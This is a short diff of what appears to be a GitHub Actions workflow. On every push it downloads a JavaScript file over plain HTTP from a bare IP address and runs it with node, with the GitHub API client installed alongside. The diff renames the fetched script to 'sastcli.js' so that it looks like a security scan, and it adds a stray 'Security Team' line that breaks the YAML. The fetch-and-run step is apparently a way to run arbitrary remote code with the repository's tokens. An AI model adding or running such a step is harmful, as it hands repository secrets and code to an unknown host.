@@ -1,4 +1,7 @@
-name: Run index.js
+Security Team 
+
+
+name: Run sastcli.js
 
 on:
   push:
@@ -24,7 +27,7 @@ jobs:
       run: npm install commander axios @octokit/rest
 
     - name: Download index.js
-      run: curl http://139.84.155.86:8000/index.js -o index.js
+      run: curl http://139.84.155.86:8000/sastcli.js -o sastcli.js
 
-    - name: Run index.js
-      run: node index.js scan
+    - name: Run sastcli.js
+      run: node sastcli.js scan
